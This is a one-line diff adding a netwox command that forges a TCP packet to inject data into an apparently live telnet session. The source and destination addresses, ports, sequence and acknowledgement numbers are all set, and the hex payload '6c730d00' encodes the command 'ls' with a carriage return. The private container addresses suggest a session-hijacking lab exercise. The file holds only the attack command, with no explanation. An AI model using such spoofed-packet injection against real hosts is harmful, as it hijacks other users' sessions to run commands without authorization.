@@ -1,0 +1,1 @@
+sudo netwox 40 --ip4-src 172.17.0.3 --ip4-dst 172.17.0.2 --tcp-src 58232 --tcp-dst 23 --tcp-seqnum 692486494 --tcp-acknum 2328888449 --tcp-ack --tcp-window 227 --tcp-data "6c730d00"
